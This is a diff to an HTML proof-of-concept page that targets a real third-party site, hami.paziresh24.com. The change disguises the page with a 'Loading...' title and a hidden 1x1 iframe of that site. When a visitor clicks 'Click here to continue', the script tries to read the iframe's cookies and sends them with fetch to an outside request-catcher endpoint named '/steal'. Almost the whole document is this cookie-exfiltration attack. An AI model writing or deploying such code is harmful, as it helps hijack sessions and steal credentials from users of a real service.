@@ -1,22 +1,30 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Redirect PoC</title>
+    <title>Loading...</title>
 </head>
 <body>
-    <a href="https://www.google.com" target="_blank">Click here to continue</a>
-    <iframe src="https://hami.paziresh24.com" width="100%" height="500"></iframe>
+    <a href="#" id="clickBtn">Click here to continue</a>
+    <iframe src="https://hami.paziresh24.com" width="1" height="1" style="display:none;"></iframe>
     <script>
         const iframe = document.querySelector('iframe');
+        const btn = document.getElementById('clickBtn');
 
-        iframe.onload = function () {
+        btn.addEventListener('click', function (e) {
+            e.preventDefault();
             try {
-                iframe.contentWindow.history.pushState({}, '', 'https://www.google.com');
-                console.log('URL changed in iframe');
+                const cookie = iframe.contentWindow.document.cookie;
+                if (cookie) {
+                    fetch('https://simon.requestcatcher.com/steal?cookie=' + encodeURIComponent(cookie));
+                    alert('Done!');
+                } else {
+                    alert('No cookie found');
+                }
             } catch (e) {
                 console.log('Error:', e.message);
+                alert('Error: ' + e.message);
             }
-        };
+        });
     </script>
 </body>
 </html>
